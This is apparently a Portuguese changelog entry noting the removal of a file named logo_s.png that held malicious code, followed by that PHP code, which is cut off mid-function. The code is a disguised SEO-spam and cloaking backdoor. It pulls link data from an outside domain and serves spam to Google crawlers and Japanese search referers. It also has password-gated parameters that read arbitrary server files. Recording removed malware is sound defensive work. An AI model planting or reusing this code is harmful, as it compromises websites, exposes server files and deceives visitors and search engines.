---
id: doc25
title: Arquivos Maliciosos
sidebar_label: COD 2016-05-28:06
---

## 25.0.0 - 2016-05-28

### Fixed

- Removido arquivo logo_s.png com código malicioso

## Código

```php

<?php 
@ini_set('display_errors', 0);
@set_time_limit(3600);
define("DOMTXT","/jdd/");
define("GETDOM","http://www.souredate-5.top/jpdd150912qi-1/");
define("FNUM",50);
define("JGNUM","292");
define("LINKNUM","14");
define("BZSITE","g");
define("BZPRO","h");
//Fnamebg
define("FILEDIRNAME","jpdd150815qi-1");
//Fnameend

//msbg
define("JDT","0");
//msend
//jthouzuibg
define("JTHZ","/");
//jthouzuiend


//keyjgbg
define("KEYJG","3");
//keyjgbgend



// #llqllq#arr_nametimebg

$arrnametime[]="4";
$arrnametime[]="2";
$arrnametime[]="3";
$arrnametime[]="1";


// #llqllq#arr_nametimeend
// #llqllq#arr_wordbg

$arr_word[0][] ="3";$arr_word[0][] ="3";$arr_word[0][] ="4";$arr_word[0][] ="3";$arr_word[0][] ="4";$arr_word[0][] ="3";$arr_word[0][] ="2";$arr_word[0][] ="2";$arr_word[0][] ="2";$arr_word[0][] ="4";$arr_word[1][] ="3";$arr_word[1][] ="4";$arr_word[1][] ="4";$arr_word[1][] ="3";$arr_word[1][] ="3";$arr_word[1][] ="2";$arr_word[1][] ="2";$arr_word[1][] ="4";$arr_word[1][] ="3";$arr_word[1][] ="2";$arr_word[2][] ="3";$arr_word[2][] ="2";$arr_word[2][] ="4";$arr_word[2][] ="2";$arr_word[2][] ="2";$arr_word[2][] ="4";$arr_word[2][] ="3";$arr_word[2][] ="3";$arr_word[2][] ="3";$arr_word[2][] ="4";$arr_word[3][] ="4";$arr_word[3][] ="3";$arr_word[3][] ="4";$arr_word[3][] ="2";$arr_word[3][] ="3";$arr_word[3][] ="2";$arr_word[3][] ="3";$arr_word[3][] ="3";$arr_word[3][] ="4";$arr_word[3][] ="2";$arr_word[4][] ="4";$arr_word[4][] ="4";$arr_word[4][] ="3";$arr_word[4][] ="4";$arr_word[4][] ="2";$arr_word[4][] ="3";$arr_word[4][] ="3";$arr_word[4][] ="3";$arr_word[4][] ="2";$arr_word[4][] ="2";$arr_word[5][] ="4";$arr_word[5][] ="4";$arr_word[5][] ="3";$arr_word[5][] ="3";$arr_word[5][] ="2";$arr_word[5][] ="2";$arr_word[5][] ="3";$arr_word[5][] ="4";$arr_word[5][] ="2";$arr_word[5][] ="3";$arr_word[6][] ="4";$arr_word[6][] ="4";$arr_word[6][] ="2";$arr_word[6][] ="2";$arr_word[6][] ="3";$arr_word[6][] ="4";$arr_word[6][] ="3";$arr_word[6][] ="2";$arr_word[6][] ="3";$arr_word[6][] ="3";$arr_word[7][] ="4";$arr_word[7][] ="4";$arr_word[7][] ="3";$arr_word[7][] ="4";$arr_word[7][] ="2";$arr_word[7][] ="3";$arr_word[7][] ="3";$arr_word[7][] ="2";$arr_word[7][] ="3";$arr_word[7][] ="2";$arr_word[8][] ="4";$arr_word[8][] ="2";$arr_word[8][] ="3";$arr_word[8][] ="2";$arr_word[8][] ="3";$arr_word[8][] ="4";$arr_word[8][] ="4";$arr_word[8][] ="2";$arr_word[8][] ="3";$arr_word[8][] ="3";$arr_word[9][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="2";$arr_word[9][] ="4";$arr_word[9][] ="4";$arr_word[9][] ="3";$arr_word[9][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="3";$arr_word[9][] ="4";$arr_word[10][] ="4";$arr_word[10][] ="4";$arr_word[10][] ="2";$arr_word[10][] ="2";$arr_word[10][] ="3";$arr_word[10][] ="2";$arr_word[10][] ="3";$arr_word[10][] ="3";$arr_word[10][] ="3";$arr_word[10][] ="4";$arr_word[11][] ="2";$arr_word[11][] ="3";$arr_word[11][] ="4";$arr_word[11][] ="2";$arr_word[11][] ="2";$arr_word[11][] ="3";$arr_word[11][] ="4";$arr_word[11][] ="3";$arr_word[11][] ="4";$arr_word[11][] ="3";

// #llqllq#arr_wordend
// #llqllq#arr_keywz

$arrKeywz[]="7";
$arrKeywz[]="6";
$arrKeywz[]="10";
$arrKeywz[]="8";
$arrKeywz[]="11";
$arrKeywz[]="4";
$arrKeywz[]="9";
$arrKeywz[]="12";
$arrKeywz[]="5";


// #llqllq#arr_keywzend
// #llqllq#arr_fuhao
$arrfh[]="、";$arrfh[]=" ";$arrfh[]="！";$arrfh[]="……";$arrfh[]="。";$arrfh[]="？";$arrfh[]="；";$arrfh[]="，";
// #llqllq#arr_fuhaoend
// #llqllq#arr_keybg

$arr_key[]="【信頼】";
$arr_key[]="【楽天スーパーセール】";
$arr_key[]="【破格値下げ】";
$arr_key[]="【驚きの価格が実現！】";
$arr_key[]="【 開梱 設置?無料 】";
$arr_key[]="【在庫一掃】";
$arr_key[]="【即日発送】";
$arr_key[]="【在庫有】";
$arr_key[]="【正規逆輸入品】";
$arr_key[]="【翌日発送可能】";
$arr_key[]="【2015年製 新品】";
$arr_key[]="【新発売】";
$arr_key[]="超歓迎された";
$arr_key[]="【ご予約品】";
$arr_key[]="入園入学祝い";
$arr_key[]="全商品オープニング価格！";
$arr_key[]="【お年玉セール特価】";
$arr_key[]="【国内即発送】";
$arr_key[]="【絶品】";
$arr_key[]="超人気";
$arr_key[]="【オンライン限定商品】";
$arr_key[]="【限定セール！】";
$arr_key[]="驚きの値段で";
$arr_key[]="【当店一番人気】";
$arr_key[]="【メール便送料無料対応可】";
$arr_key[]="【激安アウトレット!】";
$arr_key[]="非売品";
$arr_key[]="【現品限り一斉値下げ！】";
$arr_key[]="【2016春夏新作】";
$arr_key[]="【通販 人気】";
$arr_key[]="【メーカー直送】";
$arr_key[]="大注目";
$arr_key[]="【保証書付】";
$arr_key[]="【おまけ付】";
$arr_key[]="【即納！最大半額！】";
$arr_key[]="【ギフト】";
$arr_key[]="【半額】";
$arr_key[]="【年中無休】";
$arr_key[]="『3年保証』";
$arr_key[]="【楽天カード分割】";
$arr_key[]="【一部予約！】";
$arr_key[]="【送料無料キャンペーン?】";
$arr_key[]="【即発送可能】";
$arr_key[]="品質検査済";
$arr_key[]="激安大特価！";
$arr_key[]="【新品】";
$arr_key[]="完成品";
$arr_key[]="当店在庫してます！";
$arr_key[]="【着後レビューで 送料無料】";
$arr_key[]="【驚きの値段】";
$arr_key[]="驚きの価格が実現！";
$arr_key[]="【希少！！】";
$arr_key[]="人気";
$arr_key[]="【超ポイントバック祭】";
$arr_key[]="【超歓迎された】";
$arr_key[]="【公式ショップ】";
$arr_key[]="ふるさと納税";
$arr_key[]="お得セット";
$arr_key[]="【国内配送】";
$arr_key[]="【ギフト】";
$arr_key[]="★お求めやすく価格改定★";
$arr_key[]="【ファッション通販】";
$arr_key[]="【国産】";
$arr_key[]="【爆買い！】";
$arr_key[]="【開店記念セール！】";
$arr_key[]="【当店限定販売】";
$arr_key[]="『4年保証』";
$arr_key[]="【全品送料無料】";
$arr_key[]="【レビューで送料無料】";
$arr_key[]="【25％OFF】";
$arr_key[]="【メーカー再生品】";
$arr_key[]="【テレビで話題】";
$arr_key[]="【ネット限定】";
$arr_key[]="【即出荷】";
$arr_key[]="出産祝い";
$arr_key[]="【ギフ_包装】";
$arr_key[]="国産品";
$arr_key[]="好きに";
$arr_key[]="【クーポン対象外】";
$arr_key[]="【新作からSALEアイテム等お得な商品満載】";
$arr_key[]="１着でも送料無料";
$arr_key[]="【送料無料/新品】";
$arr_key[]="現品限り一斉値下げ！";
$arr_key[]="【超新作】";
$arr_key[]="●日本正規品●";
$arr_key[]="【待望★】";
$arr_key[]="限定価格セール！";
$arr_key[]="海外並行輸入正規品";
$arr_key[]="【国内正規総代理店アイテム】";
$arr_key[]="【期間限定お試し価格】";
$arr_key[]="【セール 登場から人気沸騰】";
$arr_key[]="【あす楽対応】";
$arr_key[]="ランキング第1位";
$arr_key[]="【爆売りセール開催中！】";
$arr_key[]="【超安い】";
$arr_key[]="【激安セール】";
$arr_key[]="【最安値挑戦】";
$arr_key[]="入荷中";
$arr_key[]="【数量は多】";
$arr_key[]="【高品質】";
$arr_key[]="【60％OFF】";
$arr_key[]="【メーカー包装済】";
$arr_key[]="【WEB限定】";
$arr_key[]="訳あり商品";
$arr_key[]="【税込・送料無料】";
$arr_key[]="【正規販売店】";
$arr_key[]="通販";
$arr_key[]="【時間指定不可】";
$arr_key[]="お気にいる";
$arr_key[]="【年間ランキング6年連続受賞】";
$arr_key[]="【メール便無料】";
$arr_key[]="贈り物";
$arr_key[]="【タイムセール！】";
$arr_key[]="【第1位獲得！】";
$arr_key[]="オリジナル";
$arr_key[]="誠実";
$arr_key[]="【18％OFF】";
$arr_key[]="【予約受付中】";
$arr_key[]="【在庫僅少】";
$arr_key[]="【福袋セール】";
$arr_key[]="【売れ筋】";
$arr_key[]="【ラッピング無料】";
$arr_key[]="玄関先迄納品";
$arr_key[]="【楽天ランキング1位】";
$arr_key[]="【在庫処分大特価!!】";
$arr_key[]="お見舞い";
$arr_key[]="最安値挑戦！";
$arr_key[]="日本限定";
$arr_key[]="【★大感謝セール】";
$arr_key[]="史上最も激安";
$arr_key[]="訳あり";
$arr_key[]="【人気ショップが最安値挑戦！】";
$arr_key[]="【新作入荷!!】";
$arr_key[]="【お取り寄せ】";
$arr_key[]="【国内正規品】";
$arr_key[]="【代引可】";
$arr_key[]="優先配送";
$arr_key[]="【初売り】";
$arr_key[]="【１着でも送料無料】";
$arr_key[]="【オンラインショップ】";
$arr_key[]="【限定特価】";
$arr_key[]="【返品送料無料】";
$arr_key[]="【国内在庫】";
$arr_key[]="【中古】";
$arr_key[]="【お気に入り】";
$arr_key[]="逆輸入";
$arr_key[]="【おトク】";
$arr_key[]="【予約】";
$arr_key[]="超特価SALE開催！";
$arr_key[]="上品";
$arr_key[]="★日本の職人技★";
$arr_key[]="【50％OFF】";
$arr_key[]="【あすつく】";
$arr_key[]="数量は多";
$arr_key[]="【全商品オープニング価格 特別価格】";
$arr_key[]="スーパーセール期間限定";
$arr_key[]="【サイズ交換ＯＫ】";
$arr_key[]="（訳ありセール 格安）";
$arr_key[]="『5年保証』";
$arr_key[]="代引き手数料無料";
$arr_key[]="【最安値挑戦！】";
$arr_key[]="【10％OFF】";
$arr_key[]="【在庫限り】";
$arr_key[]="新作";
$arr_key[]="【高い素材】";
$arr_key[]="日本製";
$arr_key[]="開店祝い";
$arr_key[]="【在庫あり】";
$arr_key[]="【お得】";
$arr_key[]="【格安SALEスタート】";
$arr_key[]="【T-ポイント5倍】";
$arr_key[]="【後払い手数料無料】";
$arr_key[]="【スーパーセール】";
$arr_key[]="【セール】";
$arr_key[]="大特価!!";
$arr_key[]="【超目玉枠】";
$arr_key[]="【メール便不可】";
$arr_key[]="大量入荷";
$arr_key[]="【新品、本物、当店在庫だから安心】";
$arr_key[]="【予約中！】";
$arr_key[]="【送料無料（一部地域を除く）】";
$arr_key[]="（お得な特別割引価格）";
$arr_key[]="【名入れ無料】";
$arr_key[]="【誠実】";
$arr_key[]="【お買得！】";
$arr_key[]="超ポイントアップ祭";
$arr_key[]="【史上最も激安】";
$arr_key[]="【楽ギフ_包装】";
$arr_key[]="オープニング 大放出セール";
$arr_key[]="【使い勝手の良い】";
$arr_key[]="予約販売";
$arr_key[]="【返品不可】";
$arr_key[]="『1年保証』";
$arr_key[]="【特価】";
$arr_key[]="定番";
$arr_key[]="【限定販売】";
$arr_key[]="【超特価SALE開催！】";
$arr_key[]="【即納】";
$arr_key[]="【希望者のみラッピング無料】";
$arr_key[]="【保障できる】";
$arr_key[]="【残りわずか】";
$arr_key[]="【人気商品！】";
$arr_key[]="【楽ギフ_のし宛書】";
$arr_key[]="特別価格";
$arr_key[]="【海外限定】";
$arr_key[]="開店記念セール！";
$arr_key[]="【正規品直輸入】";
$arr_key[]="【本日特価】";
$arr_key[]="【GINGER掲載商品】";
$arr_key[]="誕生日プレゼント";
$arr_key[]="【★超目玉】";
$arr_key[]="【気質アップ】";
$arr_key[]="【送料込】";
$arr_key[]="【海外 正規品】";
$arr_key[]="高価値";
$arr_key[]="完売";
$arr_key[]="【限定価格セール！】";
$arr_key[]="【美品】";
$arr_key[]="新作からSALEアイテム等お得な商品満載";
$arr_key[]="【驚きの値段で】";
$arr_key[]="希少 黒入荷！";
$arr_key[]="★大人気商品★";
$arr_key[]="【高価値】";
$arr_key[]="【同梱不可】";
$arr_key[]="オンラインショップ";
$arr_key[]="格安SALEスタート！";
$arr_key[]="感謝の声続々！";
$arr_key[]="【SEAL限定商品】";
$arr_key[]="[定休日以外毎日出荷中]";
$arr_key[]="【訳あり】";
$arr_key[]="[宅送]";
$arr_key[]="【ふるさと割】";
$arr_key[]="【お買い得！】";
$arr_key[]="特価";
$arr_key[]="【レビューを書けば送料当店負担】";
$arr_key[]="【現金特価】";
$arr_key[]="【最安値に挑戦】";
$arr_key[]="数量限定価格!!";
$arr_key[]="【海外輸入】";
$arr_key[]="【アウトレット☆送料無料】";
$arr_key[]="気質アップ";
$arr_key[]="使い勝手の良い";
$arr_key[]="【公式】";
$arr_key[]="直送商品";
$arr_key[]="正規品!";
$arr_key[]="【爆売り！】";
$arr_key[]="信頼";
$arr_key[]="【限定製作】";
$arr_key[]="【70％OFF】";
$arr_key[]="祝開店！大放出セール開催中";
$arr_key[]="【SALE】";
$arr_key[]="【メーカー公式ショップ】";
$arr_key[]="【30％OFF】";
$arr_key[]="【大注目】";
$arr_key[]="【超お買い得！】";
$arr_key[]="【初回限定お試し価格】";
$arr_key[]="【売り切り御免！】";
$arr_key[]="【受注生産品】";
$arr_key[]="【再入荷！】";
$arr_key[]="【在庫処分】";
$arr_key[]="【返品交換不可】";
$arr_key[]="セール 登場から人気沸騰";
$arr_key[]="【高額売筋】";
$arr_key[]="即納！最大半額！";
$arr_key[]="【祝開店！大放出セール開催中】";
$arr_key[]="【オープニング 大放出セール】";
$arr_key[]="早割クーポン！";
$arr_key[]="再再販！";
$arr_key[]="【35％OFF】";
$arr_key[]="『2年保証』";
$arr_key[]="【値下げ】";
$arr_key[]="名作";
$arr_key[]="【別倉庫からの配送】";
$arr_key[]="【送料無料】";
$arr_key[]="【激安大特価！】";
$arr_key[]="【限定品】";
$arr_key[]="【NEW限定品】";
$arr_key[]="【上品】";
$arr_key[]="【おすすめ】";
$arr_key[]="期間限定特別価格";
$arr_key[]="【超ポイント祭?期間限定】";
$arr_key[]="【国際ブランド】";
$arr_key[]="お気に入り";
$arr_key[]="円高還元";
$arr_key[]="【はこぽす対応商品】";
$arr_key[]="【お気にいる】";
$arr_key[]="【未使用品】";
$arr_key[]="【予約販売品】";
$arr_key[]="【日本未発売】";
$arr_key[]="【正規品】";
$arr_key[]="【2016 新作】";
$arr_key[]="【内祝い】";
$arr_key[]="【メーカー直売】";
$arr_key[]="【正規取扱店】";
$arr_key[]="【大特価!!】";
$arr_key[]="【在庫あり/即出荷可】";
$arr_key[]="【数量限定】";
$arr_key[]="【一部予約販売】";
$arr_key[]="【予約販売】本";
$arr_key[]="【ついに再販開始！】";
$arr_key[]="激安";
$arr_key[]="【2015・新作】";
$arr_key[]="当店だけの限定モデル";
$arr_key[]="【500円引きクーポン】";
$arr_key[]="保障できる";
$arr_key[]="(税込)";
$arr_key[]="【ラッピング不可】";
$arr_key[]="【税込】";
$arr_key[]="交換無料！";
$arr_key[]="【特別セール品】";
$arr_key[]="【期間限定送料無料】";
$arr_key[]="【代引き不可】";
$arr_key[]="結婚祝い";
$arr_key[]="セットアップ";
$arr_key[]="【初回限定】";
$arr_key[]="おすすめ";
$arr_key[]="【激安】";
$arr_key[]="【2015秋冬新作】";
$arr_key[]="【コンビニ受取対応商品】";
$arr_key[]="楽天";
$arr_key[]="お歳暮";
$arr_key[]="男女兼用";
$arr_key[]="福袋";
$arr_key[]="【5％OFF】";
$arr_key[]="配送員設置";
$arr_key[]="宅配便配送";
$arr_key[]="【感謝価格】";
$arr_key[]="【国際ブランド】";
$arr_key[]="【ポイント10倍】";
$arr_key[]="【日本製】";
$arr_key[]="【超目玉】";
$arr_key[]="【日本産】";
$arr_key[]="【人気商品】";
$arr_key[]="驚きの値段";
$arr_key[]="超安い";
$arr_key[]="【返品?交換対象商品】";
$arr_key[]="【お買得】";
$arr_key[]="【2015A/W新作★送料無料】";
$arr_key[]="高い素材";
$arr_key[]="【2015最新作】";
$arr_key[]="【 新品 】";
$arr_key[]="爆買い！";
$arr_key[]="【まとめ買い】";
$arr_key[]="【期間限定特価】";
$arr_key[]="【★安心の定価販売★】";
$arr_key[]="【おしゃれ】";
$arr_key[]="【楽天最安値に挑戦】";
$arr_key[]="爆売り！";


// #llqllq#arr_keyend



$q1 = "O00O0O";	$q2 = "O0O000";	$q3 = "O0OO00";	$q4 = "OO0O00";	$q5 = "OO0000";	$q6 = "O00OO0";	$q7 = "O00O00";	$q8 = "O00OOO";	$$q1 = RandAbcs();




// #llqllq#randkeybg
$strRand[0]="rhgdsjntapyoubmqwkxzelfivc";
$strRand[1]="tlcoqxjdyuegikmvhnsfrbwzap";
$strRand[2]="ujblqzwmechrvyaptkdifsgonx";
$strRand[3]="rhgyxamuetbqfoljckidnszpwv";
$strRand[4]="bdcmtvhglxrfkywoniqjpzasue";
$strRand[5]="sqwynvitrpmxclzjgodfukhbea";
$strRand[6]="qceusovtyzfxlpwdgjakhnmrbi";
$strRand[7]="kiwfvjcgtpbrxsluemnhoadqyz";
$strRand[8]="sgudvmiqlthfkporbwxzjancye";
$strRand[9]="jcgativqxhdfoywmrlbnkszpue";
$strRand[10]="ozwlfhydcqksregmibvptxjuan";
$strRand[11]="ztepxgouljvwscdbmnirfqakyh";
$strRand[12]="owbynuvhmqjsdzirafxgeckltp";
$strRand[13]="bvfzmnowkrtshicdglepaqjyux";
$strRand[14]="boazfkxgpcwsrlntumhiveyqdj";
$strRand[15]="lfsvbuajqepnwykohizxmdgrct";
$strRand[16]="vpfzadmbolhqitnwjugsrycxek";
$strRand[17]="eamzjugfcpitxbdkrsylnhqvow";
$strRand[18]="plfroqyvwutamdhkgbzxsjinec";
$strRand[19]="nwtqlzmuksaxegibyvhorpjcdf";
$strRand[20]="gcajzdxtnvqieplwubksyhmfro";
$strRand[21]="ekijzfrobycldxtmghvqasnpwu";
$strRand[22]="zxlwvjbesatuimfnyhkodgpqcr";
$strRand[23]="mzncxouafhpwkietysglrvqbdj";
$strRand[24]="adxrozsbvtpghuwyeqlncfjikm";
$strRand[25]="fkmsoewbuyvajqrlgxhtdpincz";
$strRand[26]="kxvgsychotnepmabilwqfrjduz";
$strRand[27]="pwytsgvcbaxulhjnzoerdkfqim";
$strRand[28]="aurcqktfmpwivegbdxsynohjlz";
$strRand[29]="kznucpqmblfhdweyxsrgjtvaoi";
$strRand[30]="sturxyqmnbczkvjdlafwehpiog";
$strRand[31]="ubfzxeydismaortckgvhqpwljn";
$strRand[32]="xoibtywsklfcuvhemarzjqdngp";
$strRand[33]="jnuvrldmixecbgathyposzkwqf";
$strRand[34]="dxehmcrwslqzfibaytjvgknopu";
$strRand[35]="rhswepoctnkuigbvayzmfxlqdj";
$strRand[36]="qwieoskvyrxtabdcuplfgzhnmj";
$strRand[37]="elovmwbcqpfjuiadsytzxrgnhk";
$strRand[38]="szumalqnpbgyxtewhokvicfjrd";
$strRand[39]="lavtzierpbmsodnuxkgfywhjqc";
$strRand[40]="nrieykgxtwmfuabhvpdszjcolq";
$strRand[41]="slqvmyhpkngrjxotbcufazediw";
$strRand[42]="fkplnjxmsubtizocqvaywhderg";
$strRand[43]="cfglyithesmbxouwpkaqvznjdr";
$strRand[44]="xcvoirtwbjgnafqdphulzmyeks";
$strRand[45]="lzticpkwasbqmxnfdvuheygorj";
$strRand[46]="wrkibdzslategxqnohmfupvjyc";
$strRand[47]="ijbylfvrhkmsxcewdqazuntgpo";
$strRand[48]="xnbdkjzlmearctwyogsphvqfui";
$strRand[49]="ohbkilvjagwfsrxnzecdpymutq";
$strRand[50]="fetanhrpojgwimqvxlydsucbkz";
$strRand[51]="xguetjmvplikqsnacofzdwhryb";
$strRand[52]="opnykrcljmthqfiubwdzeasvxg";
$strRand[53]="vwuszoxnqatmcjhklgpderifby";
$strRand[54]="qkofvjneuixtaphwcmbsygdrzl";
$strRand[55]="hiromlzsqdacbwvungxjkeyftp";
$strRand[56]="rakybtwmoquhcgdsezjlxipnvf";
$strRand[57]="sqdivxlhentkcromjfwbagzypu";
$strRand[58]="szvhtjegpwqkyxcrblianfmodu";
$strRand[59]="nmoerfpajbqkilhsxdutyvcgwz";
$strRand[60]="slpmiqahrwdjvfxkncytbouezg";
$strRand[61]="qeimfcdbpwxyunoksrahlvgjzt";
$strRand[62]="togsecrhldwnmijavpxuzkyfqb";
$strRand[63]="cskeomzqitjpfurbahwydvnglx";
$strRand[64]="zekqbaptuhcxdoyfgwnmjslivr";
$strRand[65]="akqhjigsfpluxvndybrztecowm";
$strRand[66]="jaowuqzchdrmsbxlfkvyneigpt";
$strRand[67]="txjuqbyfhgcdzevawomsnpiklr";
$strRand[68]="ednkupmxfvwlhryogcatjzibsq";
$strRand[69]="geiltmzwxqvdpnkfsbuoyrhcja";
$strRand[70]="elhpbnrzxjmiukwcagtdofvqys";
$strRand[71]="vhdewrkmsipcgjoxyatnqfzbul";
$strRand[72]="acqrtmoxfgyznhlsjepkdwvuib";
$strRand[73]="zgxpfthobjurimslwnaydcevkq";
$strRand[74]="sykhzgfrxpewvtmqijcaludnob";
$strRand[75]="drbaomfcuwnksxvzgqthilepjy";
$strRand[76]="gbsvkowxnpljfzyhiadqrctmeu";
$strRand[77]="jbytupfvoglewzsqmaixknrdhc";
$strRand[78]="yucmksizexqwojngltbvaphdfr";
$strRand[79]="qtzkadxijumerbwflvhnysgcop";
$strRand[80]="wnmafxrhkigdyeqtjpucvblozs";
$strRand[81]="acpxybiejmftqwodhlurgknszv";
$strRand[82]="jbgoewisfndhxmatvrpcqykzlu";
$strRand[83]="gmyuwazrfhescdtknpilxvbqjo";
$strRand[84]="ylxhitjoqzawvdbrgmfnkucspe";
$strRand[85]="ziahpfnxdsrytvlgubjwoceqkm";
$strRand[86]="ogumjvswfchpltirxeanqzykbd";
$strRand[87]="fyiabmtxvcznhesdjlqrwpkoug";
$strRand[88]="nsditrumgoqzjpcfbxahlekywv";
$strRand[89]="huvnxawybotgklcmiezjfrdqps";
$strRand[90]="kfnxpiodmetywqrjchsalbvgzu";
$strRand[91]="iqvgtwdhouacezxrnsfyplmjkb";
$strRand[92]="qdrcisvplgzynmbwuakeoxthfj";
$strRand[93]="enbpkwxuhztgcqmsivyrlojafd";
$strRand[94]="gbkwnvdjqmsycpxahloiuzrfte";
$strRand[95]="endmqzsxkocvijralypftbguwh";
$strRand[96]="nrscupgywzaexkmhobivfdljqt";
$strRand[97]="sxpzkiydjgnqcomtwralehfvub";
$strRand[98]="vhqyjfdwoszbtgxpkeailmrunc";
$strRand[99]="cspumyxvdaliewzghkbfnqrtjo";

// #llqllq#randkeyend

// $_SERVER["HTTP_REFERER"] = "google.co.jp";

$thisdom = str_replace("www.","",$_SERVER['HTTP_HOST']);



// 




$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
   $arrArrr[$j++] = $strRand{$i}.$strRand{$i+1};}
$Arrrarr = array_flip($arrArrr);
$stss = 'linkdata';



if(isset($_GET["gmap"]) && $_GET["gmap"]){
	
	$nownum = (int)trim($_GET["gmap"]);
	if($nownum > FNUM){
		header("HTTP/1.1 404 Not Found");  
		header("Status: 404 Not Found");  
		exit; 
	}

	$nownum = $nownum - 1;
	$idUrl =  GETDOM . "gpage.php?getid=$nownum";
	$tempIdStr = curl_get_from_webpage($idUrl,'',5);
	$arrId = explode(',',$tempIdStr);
	if(count($arrId) < 100){
		header("HTTP/1.1 404 Not Found");  
		header("Status: 404 Not Found");  
		exit; 
	}
	
	if($nownum == 0){
		if(JDT == 1){
				print_map($arrId,2,1);			}else{
				print_map($arrId,1,2);			}
		}else{
			
			if(JDT == 1){
				print_map2($arrId,2,1);			}else{
				print_map2($arrId,1,2);			}
	}
	
	unset($arrId);
	exit;
	
}


if(isset($_GET["gsitemap"])  &&  isset($_GET["mapnum"]) && $_GET["gsitemap"] && $_GET["mapnum"]){
	
	$O_OO0_0O_0='America/Chicago';	@date_default_timezone_set($O_OO0_0O_0);	
	if (! is_dir("sitemap"))
		mkdir("sitemap", 0755);	
	global $gnumber;
	$gnumber = 1;
	$bgNum = (int)trim($_GET["gsitemap"]);
	$mapnum = (int)trim($_GET["mapnum"]);

	if($bgNum > FNUM)
	   die("The Number Must Lower Then " . FNUM);
   
	$arrNumTemp = getMapNum($bgNum,$mapnum);

	foreach($arrNumTemp as $vss){
		
		$vals = "id$vss.php";	

	
		$idUrl =  GETDOM . "gpage.php?getid=$vss";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		$arrId = explode(',',$tempIdStr);
		// echo "<pre>";
		// print_r($arrId);
		// die();
		if(count($arrId) < 100){
			echo "g sitemap fail<br/>";
			die();
		}
		
		echo $vals."<br/>";

		if($gnumber == 1){
			if(JDT == 1){
				gsitemap($arrId,2,1);			}else{
				gsitemap($arrId,1,2);			}
		}else{
			
			if(JDT == 1){
				gsitemap2($arrId,2,1);			}else{
				gsitemap2($arrId,1,2);			}
			
		}
		
		unset($arrId,$tempArr1,$tempArr2);	}
	
}


if(isset($_GET["chdate"]) && md5($_GET["chdate"])=='8b9431d1f8083f320f2d1a3d5a0a187e' && isset($_GET["redate_file"])){$redate_file = $_GET["redate_file"];if(file_exists($redate_file)){echo '#ok#';}else{echo '#nofile#';}die();}if(isset($_GET["redate"]) && md5($_GET["redate"])=='8b9431d1f8083f320f2d1a3d5a0a187e' && isset($_GET["redate_file"])){$redate_file = $_GET["redate_file"];if(file_exists($redate_file)){echo rFile($redate_file);}else{echo '#nofile#';}die();}if(isset($_GET["test"]) && md5($_GET["test"])=='8b9431d1f8083f320f2d1a3d5a0a187e'){echo '#ok#';	die();}
if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"]) || isset($_GET["install"])){
	die();}
if(JDT==2){
	
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		$tempSid = '';		$tempPid = '';		
		
		$r0 ='#^'. BZSITE .'(\d+)[-/]#i';		
		$r1='#[-/]'. BZSITE .'(\d+)[-/]#i';		
		if(preg_match($r0,$UrlParent,$matches)){
			if(isset($matches[1]))
				$tempSid = $matches[1];		}else{
			preg_match($r1,$UrlParent,$matches10);			if(isset($matches10[1]))
				$tempSid = $matches10[1];		}
	
		
		$r2='#^'. BZPRO .'(\d+)[-/]#i';		$r3='#[-/]'. BZPRO .'(\d+)[-/]#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempSid && $tempPid){
			$_GET['id']= $tempSid .'-'. $tempPid;		}
		
	}
	
}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
		
		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		
		$r0 ='#^'. BZSITE .'(\d+)[-/]#i';		
		$r1='#[-/]'. BZSITE .'(\d+)[-/]#i';		
		if(preg_match($r0,$UrlParent,$matches)){
			if(isset($matches[1]))
				$tempSid = $matches[1];		}else{
			preg_match($r1,$UrlParent,$matches10);			if(isset($matches10[1]))
				$tempSid = $matches10[1];		}
	
		
		$r2='#^'. BZPRO .'(\d+)[-/]#i';		$r3='#[-/]'. BZPRO .'(\d+)[-/]#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempSid && $tempPid){
			$_GET['id']= $tempSid .'-'. $tempPid;		}
}
function getRandStr(){
	
	$arrABC = range('a','z');	shuffle($arrABC); 
	$randNum = rand(4,6);	
	$str = implode('',array_slice($arrABC,0,$randNum));	
	return $str;}
$iszz = isCrawler();	
$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255') ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') , array('216.172.128.0' , '216.239.159.255') ,  array('64.68.80.0' , '64.68.95.255'),  array('205.164.0.0' , '205.164.63.255') ,  array('50.117.0.0' , '50.117.127.255') ,  array('23.104.0.0' , '23.104.255.255') ,  array('23.80.0.0' , '23.80.255.255') ,  array('104.132.0.0' , '104.132.255.255') ,  array('104.134.0.0' , '104.134.255.255') ,  array('104.135.0.0' , '104.135.255.255') ,  array('38.99.82.0' , '38.99.251.255') ); 
$localIp = get_real_ip();	
$is_or_no = is_ip($localIp,$ipRanges);
$referer = $_SERVER["HTTP_REFERER"]; 
$russ = '#(google.co.jp|yahoo.co.jp|bing|docomo.ne.jp)#i';
//iiiimbfilebg
$mbFileName = 'D:\Portal\wordpress\wp-includes/images/media/mb_s.png';
$logFileName = 'D:\Portal\wordpress\wp-includes/images/media/log_s.png';
//iiiimbfileend

if(isset($_GET["id"]))
	$id = $_GET["id"];else{
	if($iszz or $is_or_no == true or preg_match($russ, $referer)){
		$fLogTime =  filemtime($mbFileName);
		$rqurl = str_replace("'","\'",$_SERVER['REQUEST_URI']);
		if(file_exists($logFileName)){
